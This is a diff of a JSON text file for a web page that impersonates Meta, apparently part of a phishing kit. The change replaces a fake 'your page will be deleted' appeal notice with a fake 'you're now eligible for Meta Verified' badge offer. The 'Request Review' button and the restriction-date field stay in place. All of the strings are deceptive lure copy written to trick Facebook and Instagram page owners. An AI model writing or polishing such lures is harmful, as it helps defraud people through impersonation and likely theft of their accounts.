@@ -47,26 +47,26 @@
     },
     "content": {
         "top_content": {
-            "title": "We have scheduled your page to be deleted",
+            "title": "You’re Now Eligible for Meta Verified - Earn trust. Stand out. Be verified.", 
             "sub": {
-                "sub_1": "We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification.",
+                "sub_1": "Congratulations! Your Page now qualifies to apply for the Verified Blue Badge on Meta. This badge signals authenticity, builds credibility, and helps increase your visibility across Facebook and Instagram.",
                 "sub_2": "If you believe restrictions have been placed on your account in error, you can request a review."
             },
-            "ticket": "Your ticket id:"
+            "ticket": "Your Request ID:"
         },
         "guide": {
-            "title": "Appeal Guide",
+            "title": "✅ Verification Request Guidelines",
             "sub": {
-                "sub_1": "Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.",
-                "sub_2": "In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
-                "sub_3": "When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated."
+                "sub_1": "Use respectful language. Requests containing threats or hate speech will be rejected.",
+                "sub_2": "Respond to any follow-up requests within 2 days.",
+                "sub_3": "Unprocessed requests will be automatically declined after 4 days."
             }
         },
         "thumb": {
-            "title": "Fixing problems with account restrictions",
+            "title": "Review Process & Policy Compliance Check",
             "sub": {
                 "sub_1": "Review request",
-                "sub_2": "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal."
+                "sub_2": "Processing typically takes 24–48 hours. Your account will be reviewed for any policy restrictions."
             },
             "button": "Request Review",
             "day": "Your page was restricted on"
